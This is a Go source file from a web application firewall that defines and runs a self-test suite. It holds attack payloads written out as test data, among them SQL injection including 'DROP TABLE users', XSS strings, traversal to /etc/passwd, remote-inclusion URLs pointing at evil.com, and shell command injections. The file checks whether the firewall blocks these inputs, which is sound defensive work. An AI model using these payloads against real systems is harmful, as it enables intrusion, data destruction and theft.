package waf

// DefaultTestSuite returns the standard WAF test suite with 9 categories
// covering major attack vectors and common bypass techniques.
func DefaultTestSuite() []TestCategory {
	return []TestCategory{
		{
			Category: "SQL Injection",
			Tests: []TestResult{
				{Name: "Basic UNION SELECT", Payload: `1' UNION SELECT * FROM users--`},
				{Name: "Comment bypass", Payload: `1'/**/UNION/**/SELECT*FROM users--`},
				{Name: "Boolean-based blind", Payload: `1 AND 1=1`, SuggestedAction: "Payload is benign at PL1 — enable PL2 or add a custom SQLi rule for stricter detection"},
				{Name: "Tautology", Payload: `1' OR '1'='1`, SuggestedAction: "Tautology patterns may need PL2 or custom rule for stricter matching"},
				{Name: "Stacked query", Payload: `1'; DROP TABLE users--`},
				{Name: "INSERT INTO", Payload: `1; INSERT INTO admins VALUES('hacker','pass')--`},
			},
		},
		{
			Category: "Cross-Site Scripting (XSS)",
			Tests: []TestResult{
				{Name: "Basic script tag", Payload: `<script>alert(1)</script>`},
				{Name: "Event handler", Payload: `<img src=x onerror=alert(1)>`},
				{Name: "SVG onload", Payload: `<svg/onload=alert(1)>`},
				{Name: "javascript: protocol", Payload: `javascript:alert(1)`},
				{Name: "Body onload", Payload: `<body onload=alert(1)>`},
				{Name: "Attribute injection", Payload: `<input onfocus=alert(1) autofocus>`},
			},
		},
		{
			Category: "Path Traversal / LFI",
			Tests: []TestResult{
				{Name: "Basic traversal", Payload: `../../../etc/passwd`},
				{Name: "URL-encoded traversal", Payload: `..%2f..%2f..%2fetc%2fpasswd`},
				{Name: "Double-encoded traversal", Payload: `..%252f..%252f..%252fetc%252fpasswd`},
				{Name: "Null byte injection", Payload: `../../../etc/passwd%00.jpg`},
				{Name: "Proc filesystem", Payload: `/proc/self/environ`},
			},
		},
		{
			Category: "Remote File Inclusion",
			Tests: []TestResult{
				{Name: "HTTP URL inclusion", Payload: `http://evil.com/shell.php`, SuggestedAction: "RFI detection may require PL2 or a custom rule targeting protocol wrappers"},
				{Name: "PHP filter", Payload: `php://filter/convert.base64-encode/resource=index`, SuggestedAction: "PHP wrappers may need PL2 or custom rule for stricter detection"},
				{Name: "FTP inclusion", Payload: `ftp://evil.com/payload`, SuggestedAction: "Non-HTTP protocols may need PL2 or custom rule"},
			},
		},
		{
			Category: "Command Injection / RCE",
			Tests: []TestResult{
				{Name: "Semicolon injection", Payload: `; cat /etc/passwd`},
				{Name: "Command substitution", Payload: `$(whoami)`},
				{Name: "Backtick injection", Payload: "`uname -a`"},
				{Name: "Newline injection", Payload: "1\nls -la", SuggestedAction: "Newline injection may require PL2 or custom rule for shell command detection"},
				{Name: "Pipe injection (PL2)", Payload: `| id`, SuggestedAction: "Pipe injection requires Paranoia Level 2 (PL2) — enable it in the Paranoia Level settings"},
			},
		},
		{
			Category: "Scanner Detection",
			Tests: []TestResult{
				{Name: "sqlmap User-Agent", Payload: "", Headers: map[string]string{"User-Agent": "sqlmap/1.5"}, SuggestedAction: "Scanner detection may need PL2 or custom scanner User-Agent rule"},
				{Name: "Nikto User-Agent", Payload: "", Headers: map[string]string{"User-Agent": "Nikto"}, SuggestedAction: "Scanner detection may need PL2 or custom scanner User-Agent rule"},
				{Name: "dirbuster User-Agent", Payload: "", Headers: map[string]string{"User-Agent": "dirbuster"}, SuggestedAction: "Scanner detection may need PL2 or custom scanner User-Agent rule"},
			},
		},
		{
			Category: "Protocol Attacks",
			Tests: []TestResult{
				{Name: "CRLF injection in URI", Payload: "/test%0d%0aInjected-Header: value", SuggestedAction: "Protocol attacks may require PL2 or custom rule for CRLF detection"},
				{Name: "HTTP method TRACE", Payload: "/", Method: "TRACE", SuggestedAction: "TRACE method blocking requires a custom rule or higher paranoia level"},
				{Name: "HTTP method TRACK", Payload: "/", Method: "TRACK", SuggestedAction: "TRACK method blocking requires a custom rule or higher paranoia level"},
			},
		},
		{
			Category: "Generic Attacks",
			Tests: []TestResult{
				{Name: "File upload PHP", Payload: `filename="shell.php"`, SuggestedAction: "File upload detection may require multipart form data context or a custom upload rule"},
			},
		},
		{
			Category: "Response Leakage",
			Tests: []TestResult{
				{Name: "SQL error in response", Payload: "You have an error in your SQL syntax; check the manual", IsResponse: true, RespHeaders: map[string]string{"Content-Type": "text/html"}},
				{Name: "Server version disclosure", Payload: "", IsResponse: true, RespHeaders: map[string]string{"Server": "Apache/2.4.51 (Ubuntu)", "Content-Type": "text/html"}, SuggestedAction: "Server header leakage detection may need PL2 or custom response-header rule"},
			},
		},
	}
}

// RunTestSuite executes the default test suite against a WAF instance.
func RunTestSuite(wafInstance *WAF) TestSuiteResult {
	suite := DefaultTestSuite()
	result := TestSuiteResult{
		Engine:  "global",
		Mode:    wafInstance.Mode(),
		Results: make([]TestCategory, 0, len(suite)),
	}

	totalPassed := 0
	totalFailed := 0

	for _, cat := range suite {
		catResult := TestCategory{
			Category: cat.Category,
			Tests:    make([]TestResult, 0, len(cat.Tests)),
		}

		for _, test := range cat.Tests {
			var payloadRes TestPayloadResult
			if test.IsResponse {
				payloadRes = wafInstance.TestResponsePayload(200, test.Payload, test.RespHeaders)
			} else {
				payloadRes = wafInstance.TestPayload(methodOrDefault(test.Method), uriOrDefault(test.Payload, test.URI), "", test.Headers)
			}
			result := TestResult{
				Name:            test.Name,
				Payload:         test.Payload,
				Blocked:         payloadRes.Blocked,
				RuleID:          payloadRes.RuleID,
				RuleMsg:         payloadRes.RuleMsg,
				SuggestedAction: test.SuggestedAction,
			}
			if !payloadRes.Blocked && payloadRes.RuleMsg == "" && test.SuggestedAction == "" {
				result.SuggestedAction = "Payload was not blocked — consider enabling a higher paranoia level or adding a custom rule"
			}
			catResult.Tests = append(catResult.Tests, result)
			if payloadRes.Blocked {
				catResult.Passed++
				totalPassed++
			} else {
				catResult.Failed++
				totalFailed++
			}
		}

		result.Results = append(result.Results, catResult)
	}

	result.Summary = TestSummary{
		Total:  totalPassed + totalFailed,
		Passed: totalPassed,
		Failed: totalFailed,
	}

	return result
}

func methodOrDefault(m string) string {
	if m != "" {
		return m
	}
	return "GET"
}

func uriOrDefault(payload, uri string) string {
	if uri != "" {
		return uri
	}
	return "/test?q=" + payload
}

// runSingleTest runs a single test payload through the WAF.
// Deprecated: use TestPayload directly.
func runSingleTest(wafInstance *WAF, test TestResult) bool {
	method := "GET"
	uri := "/test?q=" + test.Payload
	body := ""
	headers := map[string]string{"User-Agent": "Mozilla/5.0 (compatible; WAF Test Suite)"}

	if test.Headers != nil {
		for k, v := range test.Headers {
			headers[k] = v
		}
	}
	if test.Method != "" {
		method = test.Method
	}
	if test.URI != "" {
		uri = test.URI
	}
	if test.Payload == "" && len(test.Headers) > 0 {
		uri = "/test"
	}

	res := wafInstance.TestPayload(method, uri, body, headers)
	return res.Blocked
}
